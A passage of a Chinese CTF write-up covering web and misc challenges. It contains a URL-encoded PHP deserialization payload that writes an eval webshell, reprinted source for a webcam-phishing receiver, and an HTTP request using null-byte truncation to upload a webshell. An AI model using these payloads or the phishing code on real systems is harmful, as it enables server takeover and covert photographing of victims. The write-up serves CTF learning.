class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A6</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>expire</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bi</span><span class=o>%</span><span class=mi>3</span><span class=n>A3600</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A12</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>cache_subdir</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bb</span><span class=o>%</span><span class=mi>3</span><span class=n>A0</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A6</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>prefix</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A0</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A4</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>path</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A144</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>php</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>2</span><span class=n>F</span><span class=o>%</span><span class=mi>2</span><span class=n>Ffilter</span><span class=o>%</span><span class=mi>2</span><span class=n>Fconvert</span><span class=o>.</span><span class=n>iconv</span><span class=o>.</span><span class=n>utf</span><span class=o>-</span><span class=mf>8.</span><span class=n>utf</span><span class=o>-</span><span class=mi>7</span><span class=o>%</span><span class=mi>7</span><span class=n>Cconvert</span><span class=o>.</span><span class=n>base64</span><span class=o>-</span><span class=n>decode</span><span class=o>%</span><span class=mi>2</span><span class=n>Fresource</span><span class=o>%</span><span class=mi>3</span><span class=n>DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g</span><span class=o>%</span><span class=mi>2</span><span class=n>F</span><span class=o>..%</span><span class=mi>2</span><span class=n>Fpublic</span><span class=o>%</span><span class=mi>2</span><span class=n>Fuploads</span><span class=o>%</span><span class=mi>2</span><span class=n>Fimages</span><span class=o>%</span><span class=mi>2</span><span class=n>Fa</span><span class=o>.</span><span class=n>php</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A13</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>data_compress</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bb</span><span class=o>%</span><span class=mi>3</span><span class=n>A0</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>7</span><span class=n>Ds</span><span class=o>%</span><span class=mi>3</span><span class=n>A6</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=o>%</span><span class=mi>2</span><span class=n>A</span><span class=o>%</span><span class=mi>00</span><span class=n>tag</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A3</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>xxx</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span><span class=o>%</span><span class=mi>7</span><span class=n>Ds</span><span class=o>%</span><span class=mi>3</span><span class=n>A9</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=o>%</span><span class=mi>2</span><span class=n>A</span><span class=o>%</span><span class=mi>00</span><span class=n>styles</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Ba</span><span class=o>%</span><span class=mi>3</span><span class=n>A1</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bi</span><span class=o>%</span><span class=mi>3</span><span class=n>A0</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A7</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>getAttr</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span><span class=o>%</span><span class=mi>7</span><span class=n>Ds</span><span class=o>%</span><span class=mi>3</span><span class=n>A6</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>parent</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Br</span><span class=o>%</span><span class=mi>3</span><span class=n>A11</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804142614827.png loading=lazy alt=image-20210804142614827></p><p>最后执行根目录的readflag即可：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804143045911.png loading=lazy alt=image-20210804143045911></p><h2 id=jjs-camera>jj&rsquo;s camera</h2><p>挺有意思的一道题目。</p><p>打开之后的页面是这样的：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804143431831.png loading=lazy alt=image-20210804143431831></p><p>点击生成链接之后底下会生成一个可以跳转的链接：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804143519200.png loading=lazy alt=image-20210804143519200></p><p>但是除了弹出一个框就啥也没了：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804143554938.png loading=lazy alt=image-20210804143554938></p><p>然后点击查看照片也是一直显示没有照片：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804143632790.png loading=lazy alt=image-20210804143632790></p><p>懵了半天，然后拿到Firefox打开的时候，发现它提示我是否允许开启摄像头权限，联想到题目的名字”jj&rsquo;s camera“，把摄像头的权限给了他看看，反正咱也贴了胶布不是。然后会发现他会拍下一张照片并提交给qbl.php，然后跳转到上边填写的链接。</p><p>把上边的串起来，这个网站就是一个钓鱼的后台，生成钓鱼链接，当受害者点击生成的链接并且给了摄像头权限之后就可以拍到受害者的照片并返回给后台。</p><p>这个qbl.php就是接受照片并处理跳转的php，因为名字起的挺奇怪的，所以我们就直接去google它，然后发现网上有源码：</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804144210075.png loading=lazy alt=image-20210804144210075></p><p>链接：<a class=link href=https://zhuanlan.zhihu.com/p/369275296 target=_blank rel=noopener>在吗宝贝？你点开这个网址看看【打开网站偷拍照片】] - 知乎 (zhihu.com)</a></p><p>qbl.php：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$base64_img</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;img&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=nv>$id</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=nv>$up_dir</span> <span class=o>=</span> <span class=s1>&#39;./img/&#39;</span><span class=p>;</span><span class=c1>//存放在当前目录的img文件夹下
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$id</span><span class=p>)</span> <span class=o>||</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$url</span><span class=p>)</span> <span class=o>||</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$base64_img</span><span class=p>)){</span> 
+</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$up_dir</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>  <span class=nx>mkdir</span><span class=p>(</span><span class=nv>$up_dir</span><span class=p>,</span><span class=mo>0777</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^(data:\s*image\/(\w+);base64,)/&#39;</span><span class=p>,</span> <span class=nv>$base64_img</span><span class=p>,</span> <span class=nv>$result</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>  <span class=nv>$type</span> <span class=o>=</span> <span class=nv>$result</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$type</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;bmp&#39;</span><span class=p>,</span><span class=s1>&#39;png&#39;</span><span class=p>))){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$new_file</span> <span class=o>=</span> <span class=nv>$up_dir</span><span class=o>.</span><span class=nv>$id</span><span class=o>.</span><span class=s1>&#39;_&#39;</span><span class=o>.</span><span class=nx>date</span><span class=p>(</span><span class=s1>&#39;mdHis_&#39;</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;.&#39;</span><span class=o>.</span><span class=nv>$type</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$new_file</span><span class=p>,</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nx>str_replace</span><span class=p>(</span><span class=nv>$result</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$base64_img</span><span class=p>)));</span>
+</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: &#34;</span><span class=o>.</span><span class=nv>$url</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>注意到服务器的php版本是5.2.17，对代码进行审计，我们可以在id处利用00截断，将后边的png后缀去掉，从而上传shell，payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/qbl.php?id=shell.php%00a&amp;url=http://baidu.com</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>node4.buuoj.cn:27340</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>106</span>
+</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua</span><span class=o>:</span> <span class=l>&#34;Chromium&#34;;v=&#34;91&#34;, &#34; Not;A Brand&#34;;v=&#34;99&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Mobile</span><span class=o>:</span> <span class=l>?0</span>
+</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>https://node4.buuoj.cn:27340</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>same-origin</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
+</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>https://node4.buuoj.cn:27340/sc.php?id=1&amp;url=http://baidu.com</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>img=data%3Aimage%2Fpng%3Bbase64%2CPD9waHAgaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pO0BldmFsKCRfUE9TVFtrMXRlXSk7Pz4=
+</span></span></code></pre></td></tr></table></div></div><p>图片会放在img目录下，直接去找就行:</p><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210804150727863.png loading=lazy alt=image-20210804150727863></p><h1 id=misc>Misc</h1><h2 id=just-a-gif>Just a GIF</h2><p>将gif逐帧分解之后发现很多冗余图片，每11张一个循环，遂写脚本看看那些地方不同：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=c1># gif逐帧分解</span>
+</span></span><span class=line><span class=cl>    <span class=n>im</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;Just_a_GIF.gif&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=s1>&#39;src&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=s1>&#39;src&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>count</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>im</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=n>count</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>im</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s1>&#39;src/&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>count</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;.png&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>count</span> <span class=o>=</span> <span class=n>count</span> <span class=o>+</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>pass</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;帧数&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>count</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 找不同</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=s1>&#39;result&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=s1>&#39;result&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>rows</span> <span class=o>=</span> <span class=mi>119</span>
+</span></span><span class=line><span class=cl>    <span class=n>cols</span> <span class=o>=</span> <span class=mi>83</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>column</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>11</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;RGBA&#39;</span><span class=p>,(</span><span class=n>rows</span><span class=p>,</span><span class=n>cols</span><span class=p>),</span><span class=s1>&#39;black&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>row</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>41</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>origin</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;src/</span><span class=si>{</span><span class=n>column</span><span class=si>}</span><span class=s2>.png&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>convert</span><span class=p>(</span><span class=s1>&#39;RGBA&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>load</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=n>diff</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;src/</span><span class=si>{</span><span class=n>row</span><span class=o>*</span><span class=mi>11</span><span class=o>+</span><span class=n>column</span><span class=si>}</span><span class=s2>.png&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>convert</span><span class=p>(</span><span class=s1>&#39;RGBA&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>load</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>rows</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>cols</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>origin</span><span class=p>[</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>]</span> <span class=o>!=</span> <span class=n>diff</span><span class=p>[</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>                        <span class=n>result</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>),(</span><span class=mi>255</span><span class=p>,</span><span class=mi>255</span><span class=p>,</span><span class=mi>255</span><span class=p>,</span><span class=mi>255</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;result/</span><span class=si>{</span><span class=n>column</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s1>.png&#39;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到若干长得像二维码的图片以及两张顺序图，很明显是贴起来了，但是图片右边有黑边，先切掉再拼接：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>images</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;RGB&#39;</span><span class=p>,(</span><span class=mi>83</span><span class=o>*</span><span class=mi>3</span><span class=p>,</span><span class=mi>83</span><span class=o>*</span><span class=mi>3</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>10</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>im</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;result/</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>.png&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>images</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>im</span><span class=o>.</span><span class=n>crop</span><span class=p>((</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>83</span><span class=p>,</span><span class=mi>83</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>order</span> <span class=o>=</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>7</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>6</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>9</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>4</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>5</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>8</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>row</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>col</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>index</span> <span class=o>=</span> <span class=n>order</span><span class=p>[</span><span class=n>row</span><span class=p>][</span><span class=n>col</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>flag</span><span class=o>.</span><span class=n>paste</span><span class=p>(</span><span class=n>images</span><span class=p>[</span><span class=n>index</span><span class=o>-</span><span class=mi>1</span><span class=p>],(</span><span class=n>col</span><span class=o>*</span><span class=mi>83</span><span class=p>,</span><span class=n>row</span><span class=o>*</span><span class=mi>83</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=c1># flag.show()</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s1>&#39;flag.png&#39;</span><span class=p>)</span> 
+</span></span></code></pre></td></tr></table></div></div><p>是个DataMatrix，直接识别即可</p><h1 id=写在最后>写在最后</h1><p>其实不能说题目质量不行，只是因为比赛的时候时间紧，所以就只能直接拿网上的payload打，但是赛后再来看看，照着网上的文章，一个函数一个函数跟进，还是能学到很多东西的。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/wp/>Wp</a>
+<a href=/tags/ctf/>Ctf</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8Aweb/><div class=article-details><h2 class=article-title>2021第五空间线上web</h2></div></a></article><article><a href=/p/cybrics2021/><div class=article-details><h2 class=article-title>CyBRICS2021</h2></div></a></article><article><a href=/p/vnctf2021/><div class=article-details><h2 class=article-title>VNCTF2021</h2></div></a></article><article><a href=/p/2021%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF/><div class=article-details><h2 class=article-title>2021大吉大利杯</h2></div></a></article><article><a href=/p/bjdctf2020/><div class=article-details><h2 class=article-title>BJDCTF2020</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not 